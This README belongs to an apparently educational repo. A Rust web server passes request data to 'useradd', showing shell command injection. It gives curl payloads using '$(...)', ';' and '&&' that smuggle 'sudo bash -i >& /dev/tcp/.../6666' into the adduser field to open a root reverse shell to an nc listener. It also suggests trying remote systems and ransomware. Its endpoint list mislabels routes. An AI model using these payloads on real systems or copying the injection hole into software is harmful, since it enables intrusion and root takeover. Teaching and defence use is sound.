# Shell injection / Reverse shell example

This is a little example repo on how to perform a shell injection through a web query.

It's written in Rust to prove that while Rust can protect against memory safety it can't protect against bad logic.

## IMPORTANT NOTE

DON'T JUST EXECUTE THIS ON YOUR MACHINE, USE THE DOCKER / DEVCONTAINER TO RUN THE APPLICATION. IT IS USING SUDO AND CHANGING USER STATE SO
PLEASE BE CAREFUL

# Building / Running

This repo can be opened as a devcontainer in vscode, or you can run the Dockerfile in the main directory and run the app as its own container

## Dockerfile

```
docker build -t shell_injection .
docker run --name shell_injection -p 8000:8000 --network host shell_injection
```

At this point port 8000 should be open and you can attack the system.

## Devcontainer

Open the repo in VSCode and use the reopen in devcontainer.

Start the server using

```
cargo run
```

This will open up a port 8000 for the webserver.

There are 3 endpoints:
* GET `http://localhost/` - just returns "Hello World"
* POST `http://localhost/hellouser` - This will add a user 
* POST `http://localhost/adduser` - This will delete a user
* POST `http://localhost/hellouser` - This will say "hello [user]" if the user exists or give you a "user doesn't exist" response.

# Examples of commands

## Index page
```
$ curl -X GET http://localhost:8000/
Hello, world!
```

## Add user
```
$ curl -X POST http://localhost:8000/adduser --data "paul"
Added user paul
```

## Del user
```
$ curl -X POST http://localhost:8000/deluser --data "paul"
Deleted user paul
```

## Hello user

User that doesn't exist
```
$ curl -X POST http://localhost:8000/hellouser --data "paul"
No user with that name
```

User that exists
```
$ curl -X POST http://localhost:8000/hellouser --data "peter"
Hello peter
```

# The attack

## Prerequisites 

You can use `nc` to open a port to accept a shell with:

```
nc -lvp 6666
```

## Injection and Reverse Shell

If you use curl to send data to the `http://localhost/adduser` endpoint you can use a shell injection technique to hide a command inside the payload

A legitimate request 

```
curl -X POST localhost:8000/adduser --data "richc"
```

Gets a response
```
Added 'richc' as a user
```

The idea is that this web address executes the `useradd` command in linux to add a user to the system. This is fairly typical in some IoT devices. Not necessarily good practice but has been seen in the past.

This can be manipulated to get a reverse-shell as well

```
curl -X POST localhost:8000/adduser --data "\$(sudo bash -i >& /dev/tcp/[target machine address]/6666 0>&1 &)"
```

Where `[target ip address]` is the address of a target machine running `nc -lvp 6666` which will accept the shell connection. Normally I use `localhost`

Even worse with this example is that this user in docker has unrestricted sudo access, so....

There are other commands that can work as well, such as
```
curl -X POST localhost:8000/adduser --data "peter; sudo bash -i >& /dev/tcp/localhost/6666 0>&1 &"
curl -X POST localhost:8000/adduser --data "peter && sudo bash -i >& /dev/tcp/localhost/6666 0>&1 &"
```

Would have given full root access to the system

This is also possible if the program is initially run as root (which is more common than you'd like to think, especially with programs that interact with the command line, or embedded linux devices)

# Flaws in the Program

This program made several mistakes.

* Allowed a web user to access the linux command line
* unrestricted sudo access
* Not sanitising the commands executed

How would you go about fixing these problems?

# Further Work

* Try to get this to open a reverse shell on a fully remote system
* Try to execute something else on the shell
* How else could you attack this? install SSH / other tools remotely / FTP / ransomware